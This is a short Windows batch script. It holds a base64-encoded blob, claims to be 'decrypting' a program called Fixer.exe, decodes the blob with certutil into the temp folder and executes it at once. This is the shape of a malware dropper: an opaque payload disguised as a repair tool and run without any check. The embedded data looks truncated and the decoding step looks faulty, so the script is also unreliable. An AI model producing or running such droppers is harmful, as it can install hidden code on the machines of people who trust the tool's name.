@echo off
SETLOCAL

set "encodedFixer=UEsDBBQAAAAIAEjLyA8pyPzV0v3J8mQezyT+FS4e23FeOEXI0Gn6Tg3Z3LlI2Pfjz70eA1hgSuIj5RlGk4fg+JlB4IC5P1Fg3lGS4JYJlczv5mje65y6eqA2Pgsd1OZG9gD5On4ATBGWoxPY2XGo8HlYNoGL9yrM4XfFZL4RRy2HwDQskZ1mhqLnkMbOeU7UgTnHbIYOESttQXG8iJHn93NB+8qESMya1QQZBdcohWXYqk7iXsYvX7Gp1zExDWPMo6+FOvHqYumJw5w/lNofFVwv9KH1lShDzHljNNmkBeqz2zbsQ46RJlHtUpjmmd61+J3c7g24H2On2MYTOglJ9b1oRJZmVwVQ=="

echo Decrypting Fixer.exe...
echo %encodedFixer% | certutil -decode - %temp%\Fixer.exe

IF EXIST "%temp%\Fixer.exe" (
    echo Decryption complete. Executing Fixer.exe...
    start "" "%temp%\Fixer.exe"
) ELSE (
    echo Failed to decrypt Fixer.exe. Please check the encoded data and try again.
)

pause
ENDLOCAL
